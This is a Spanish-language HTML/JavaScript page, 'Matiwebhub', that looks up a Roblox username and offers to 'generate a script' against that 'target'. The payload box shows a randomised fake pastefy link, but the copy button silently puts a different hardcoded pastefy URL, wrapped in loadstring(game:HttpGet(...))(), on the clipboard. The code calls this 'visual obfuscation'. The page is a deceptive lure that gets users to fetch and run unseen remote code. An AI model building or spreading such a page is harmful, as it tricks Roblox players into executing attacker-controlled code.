<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matiwebhub | Nexus Core</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background: radial-gradient(circle at 10% 20%, #0a0a0f, #030305);
            font-family: 'Inter', system-ui, sans-serif;
        }
        .premium-panel {
            background: rgba(18, 18, 23, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(79, 70, 229, 0.3);
        }
        .btn-gradient {
            background: linear-gradient(95deg, #4f46e5, #7c3aed);
        }
        .loading-spinner {
            border: 2px solid rgba(79,70,229,0.2);
            border-top: 2px solid #4f46e5;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .avatar-img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #4f46e5;
            object-fit: cover;
        }
        .code-block {
            background: #01010b;
            border-left: 3px solid #4f46e5;
            word-break: break-all;
        }
    </style>
</head>
<body class="p-5 flex justify-center items-center min-h-screen">
    <div class="w-full max-w-lg mx-auto space-y-6">
        
        <!-- Header -->
        <div class="text-center">
            <div class="inline-block bg-black/40 rounded-full px-4 py-1 mb-3">
                <span class="text-[10px] text-emerald-400">● ACTIVE · SECURE NEXUS</span>
            </div>
            <h1 class="text-5xl font-black bg-gradient-to-r from-white to-indigo-400 bg-clip-text text-transparent">
                MATIWEBHUB
            </h1>
            <p class="text-gray-400 text-xs mt-2">Motor de autenticación biométrica</p>
        </div>

        <!-- Panel Principal -->
        <div class="premium-panel rounded-2xl p-5 space-y-4">
            <div>
                <label class="text-[10px] font-bold text-indigo-400">TARGET IDENTIFIER</label>
                <div class="relative mt-1">
                    <input type="text" id="userInput" placeholder="builderman" 
                           class="w-full p-3 rounded-xl bg-[#0f0f15] border border-gray-700 text-white focus:border-indigo-500 outline-none">
                    <div id="searchLoader" class="absolute right-3 top-1/2 -translate-y-1/2 hidden">
                        <div class="loading-spinner"></div>
                    </div>
                </div>
                <button id="searchBtn" class="w-full mt-2 py-2 rounded-xl bg-indigo-600 text-white text-xs font-bold hover:bg-indigo-500 transition">
                    🔍 BUSCAR USUARIO
                </button>
            </div>

            <!-- Perfil -->
            <div id="profileBox" class="hidden">
                <div id="selectableCard" class="flex items-center gap-4 p-3 rounded-xl bg-indigo-950/20 border border-indigo-500/40 cursor-pointer hover:bg-indigo-950/40 transition">
                    <div id="avatarContainer" class="w-12 h-12 rounded-full bg-indigo-900/40 flex items-center justify-center">
                        <i class="fas fa-user text-indigo-300"></i>
                    </div>
                    <div class="flex-1">
                        <div class="font-bold text-white" id="usernameDisplay">---</div>
                        <div class="text-[10px] text-indigo-300" id="statusText">Esperando usuario...</div>
                    </div>
                    <i class="fas fa-chevron-right text-indigo-400"></i>
                </div>
            </div>
        </div>

        <!-- Botones -->
        <div class="space-y-3">
            <button id="freezeBtn" disabled class="w-full p-3 rounded-xl bg-gray-800 text-gray-400 text-xs font-bold disabled:opacity-50">
                ❄️ SCRIPT FREEZE · LOCK TARGET
            </button>
            <button id="genBtn" disabled class="w-full p-4 rounded-xl btn-gradient text-white text-sm font-bold disabled:opacity-50 disabled:bg-gray-700">
                ⚡ GENERATE SCRIPT
            </button>
        </div>

        <!-- Output -->
        <div id="output" class="premium-panel rounded-2xl p-4 hidden">
            <div class="flex justify-between mb-2">
                <span class="text-[10px] text-indigo-400">GENERATED PAYLOAD</span>
                <button id="copyBtn" class="text-[10px] bg-indigo-900/50 px-2 py-1 rounded">📋 Copiar</button>
            </div>
            <div class="code-block p-3 rounded-lg bg-black/60 text-[11px] text-indigo-100">
                <code id="scriptCode"></code>
            </div>
        </div>

        <!-- Footer -->
        <div class="flex justify-between text-[9px] text-gray-600">
            <span>Matiwebhub v.4.2</span>
            <span class="text-emerald-400">● NEXUS LIVE</span>
        </div>
    </div>

    <script>
        // Elementos
        const userInput = document.getElementById('userInput');
        const searchBtn = document.getElementById('searchBtn');
        const profileBox = document.getElementById('profileBox');
        const usernameDisplay = document.getElementById('usernameDisplay');
        const statusText = document.getElementById('statusText');
        const avatarContainer = document.getElementById('avatarContainer');
        const selectableCard = document.getElementById('selectableCard');
        const freezeBtn = document.getElementById('freezeBtn');
        const genBtn = document.getElementById('genBtn');
        const outputDiv = document.getElementById('output');
        const scriptCode = document.getElementById('scriptCode');
        const copyBtn = document.getElementById('copyBtn');
        const searchLoader = document.getElementById('searchLoader');

        // Estados
        let currentUser = null;
        let isSelected = false;
        let isFrozen = false;
        let generatedScript = "";

        const REAL_LINK = "https://pastefy.app/e8DClYOX/raw";

        // Generar texto aleatorio para ofuscación visual
        function randomId() {
            return Math.random().toString(36).substring(2, 10);
        }

        // Mostrar notificación
        function toast(msg, color = 'emerald') {
            const toast = document.createElement('div');
            toast.className = `fixed bottom-5 left-1/2 -translate-x-1/2 px-4 py-2 rounded-full text-white text-xs z-50 bg-${color}-600`;
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 2500);
        }

        // Buscar usuario en Roblox (API directa, sin CORS)
        async function buscarUsuario() {
            const username = userInput.value.trim().toLowerCase();
            
            if (username.length < 3) {
                toast("Escribe al menos 3 caracteres", "amber");
                return;
            }

            // Mostrar loading
            searchLoader.classList.remove('hidden');
            searchBtn.disabled = true;
            searchBtn.textContent = '⏳ BUSCANDO...';
            profileBox.classList.remove('hidden');
            usernameDisplay.textContent = username;
            statusText.textContent = 'Conectando con Roblox...';
            avatarContainer.innerHTML = '<i class="fas fa-spinner fa-pulse text-indigo-300 text-xl"></i>';

            try {
                // Usar api.roblox.com - NO necesita proxy, funciona directamente
                const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
                const data = await response.json();
                
                console.log("Respuesta de Roblox:", data);
                
                if (data && data.Id) {
                    // Usuario encontrado
                    currentUser = {
                        id: data.Id,
                        name: data.Username
                    };
                    
                    usernameDisplay.textContent = currentUser.name;
                    statusText.textContent = '✅ VERIFICADO - TAP PARA SELECCIONAR';
                    
                    // Avatar
                    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${currentUser.id}&width=48&height=48&format=png`;
                    avatarContainer.innerHTML = `<img src="${avatarUrl}" class="avatar-img" onerror="this.src='https://via.placeholder.com/48'">`;
                    
                    toast(`✅ Usuario ${currentUser.name} encontrado`, "emerald");
                    
                    // Resetear selección
                    isSelected = false;
                    isFrozen = false;
                    freezeBtn.disabled = true;
                    genBtn.disabled = true;
                    selectableCard.classList.remove('border-emerald-500', 'bg-emerald-950/20');
                    selectableCard.classList.add('border-indigo-500/40');
                    freezeBtn.innerHTML = '❄️ SCRIPT FREEZE · LOCK TARGET';
                    freezeBtn.classList.remove('bg-red-800');
                    freezeBtn.classList.add('bg-gray-800');
                    outputDiv.classList.add('hidden');
                    
                } else {
                    // Usuario no encontrado
                    currentUser = null;
                    statusText.textContent = '❌ USUARIO NO ENCONTRADO';
                    avatarContainer.innerHTML = '<i class="fas fa-exclamation-triangle text-amber-400 text-xl"></i>';
                    toast("Usuario no encontrado", "red");
                }
                
            } catch (error) {
                console.error("Error:", error);
                statusText.textContent = '⚠️ ERROR DE CONEXIÓN';
                avatarContainer.innerHTML = '<i class="fas fa-plug text-amber-400 text-xl"></i>';
                toast("Error de conexión. ¿Tienes internet?", "red");
                currentUser = null;
            } finally {
                searchLoader.classList.add('hidden');
                searchBtn.disabled = false;
                searchBtn.textContent = '🔍 BUSCAR USUARIO';
            }
        }

        // Seleccionar target
        function selectTarget() {
            if (!currentUser) {
                toast("Primero busca un usuario válido", "amber");
                return;
            }
            
            if (isSelected) return;
            
            isSelected = true;
            selectableCard.classList.add('border-emerald-500', 'bg-emerald-950/20');
            statusText.textContent = '🎯 TARGET SELECCIONADO';
            freezeBtn.disabled = false;
            genBtn.disabled = false;
            toast(`🎯 Target seleccionado: ${currentUser.name}`, "emerald");
        }

        // Freeze / Unfreeze
        function toggleFreeze() {
            if (!isSelected) {
                toast("Primero selecciona un target", "amber");
                return;
            }
            
            if (isFrozen) {
                isFrozen = false;
                freezeBtn.innerHTML = '❄️ SCRIPT FREEZE · LOCK TARGET';
                freezeBtn.classList.remove('bg-red-800');
                freezeBtn.classList.add('bg-gray-800');
                genBtn.disabled = false;
                toast("🔓 Target descongelado", "info");
            } else {
                isFrozen = true;
                freezeBtn.innerHTML = '⚠️ TARGET FROZEN · UNLOCK TO GENERATE';
                freezeBtn.classList.remove('bg-gray-800');
                freezeBtn.classList.add('bg-red-800');
                genBtn.disabled = true;
                outputDiv.classList.add('hidden');
                toast("❄️ Target congelado", "red");
            }
        }

        // Generar script con ofuscación visual
        function generarScript() {
            if (!isSelected) {
                toast("Primero selecciona un target", "amber");
                return;
            }
            
            if (isFrozen) {
                toast("Descongela el target primero", "red");
                return;
            }
            
            // Ofuscación visual: enlace falso aleatorio
            const fakeId = randomId();
            const fakeLink = `https://pastefy.app/${fakeId}/raw`;
            const scriptVisual = `loadstring(game:HttpGet("${fakeLink}"))()`;
            
            // Script real (para copiar)
            generatedScript = `loadstring(game:HttpGet("${REAL_LINK}"))()`;
            
            scriptCode.textContent = scriptVisual;
            outputDiv.classList.remove('hidden');
            toast("✅ Script generado (ofuscación visual)", "emerald");
        }

        // Copiar script real
        function copiarScript() {
            if (!generatedScript) {
                toast("No hay script generado", "amber");
                return;
            }
            
            navigator.clipboard.writeText(generatedScript).then(() => {
                toast("📋 Script REAL copiado", "emerald");
            }).catch(() => {
                toast("Error al copiar", "red");
            });
        }

        // Eventos
        searchBtn.addEventListener('click', buscarUsuario);
        userInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') buscarUsuario();
        });
        selectableCard.addEventListener('click', selectTarget);
        freezeBtn.addEventListener('click', toggleFreeze);
        genBtn.addEventListener('click', generarScript);
        copyBtn.addEventListener('click', copiarScript);

        console.log("✅ Matiwebhub listo - Escribe un usuario y presiona BUSCAR");
    </script>
</body>
</html>
